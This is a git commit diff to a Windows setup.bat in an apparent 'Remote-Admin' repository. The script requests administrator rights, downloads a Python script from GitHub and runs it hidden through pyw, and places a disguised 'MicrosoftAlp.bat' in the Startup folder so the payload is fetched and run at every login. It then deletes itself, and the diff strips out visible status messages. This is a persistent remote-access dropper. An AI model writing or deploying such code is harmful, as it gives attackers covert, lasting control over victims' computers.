b9f1760194bf9bf3a29bb557810802d7cdf6fe6c
Mana <86923626+Mana42138@users.noreply.github.com>
2024-07-05 00:50:17 +0200

    Update setup.bat

--- setup.bat
+++ setup.bat
@@ -1,6 +1,12 @@
-:: Python32w.pyw
-
 @echo off
+
+set DOWNLOAD_DIR=%TEMP%
+set PYTHON_SCRIPT_URL=https://raw.githubusercontent.com/Mana42138/Remote-Admin/master/Host_Target.py
+set PYTHON_SCRIPT_NAME=Python32w.pyw
+set PYTHON_SCRIPT_PATH=%DOWNLOAD_DIR%\%PYTHON_SCRIPT_NAME%
+set STARTUP_BATCH_NAME=MicrosoftAlp.bat
+set STARTUP_BATCH_PATH=%DOWNLOAD_DIR%\%STARTUP_BATCH_NAME%
+set STARTUP_FOLDER="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
 if '%errorlevel%' NEQ '0' (
@@ -19,16 +25,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-set DOWNLOAD_DIR=%TEMP%
-set PYTHON_SCRIPT_URL=https://raw.githubusercontent.com/Mana42138/Remote-Admin/master/Host_Target.py
-set PYTHON_SCRIPT_NAME=Python32w.pyw
-set PYTHON_SCRIPT_PATH=%DOWNLOAD_DIR%\%PYTHON_SCRIPT_NAME%
-set STARTUP_BATCH_NAME=MicrosoftAlp.bat
-set STARTUP_BATCH_PATH=%DOWNLOAD_DIR%\%STARTUP_BATCH_NAME%
-set STARTUP_FOLDER="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-
-
-
 py --version >nul 2>&1
 IF %ERRORLEVEL% NEQ 0 (
     curl -o "%DOWNLOAD_DIR%\python-installer.exe" https://www.python.org/ftp/python/3.11.3/python-3.11.3-amd64.exe
@@ -39,18 +35,18 @@ IF %ERRORLEVEL% NEQ 0 (
         exit /b 1
     )
 ) ELSE (
-    echo Python is already installed
+    echo Python was Analyzed
 )
 
-echo Creating startup batch file...
 echo @echo off > "%STARTUP_BATCH_PATH%"
-echo start curl -s "%PYTHON_SCRIPT_URL%" ^| pyw - >> "%STARTUP_BATCH_PATH%"
+echo curl -s "%PYTHON_SCRIPT_URL%" ^| pyw - >> "%STARTUP_BATCH_PATH%"
+
+move "%STARTUP_BATCH_PATH%" %STARTUP_FOLDER%
 
 start /min curl -s "%PYTHON_SCRIPT_URL%" | pyw -
 
 :: Clean up
 del "%~f0"
 
-pause
 
 exit
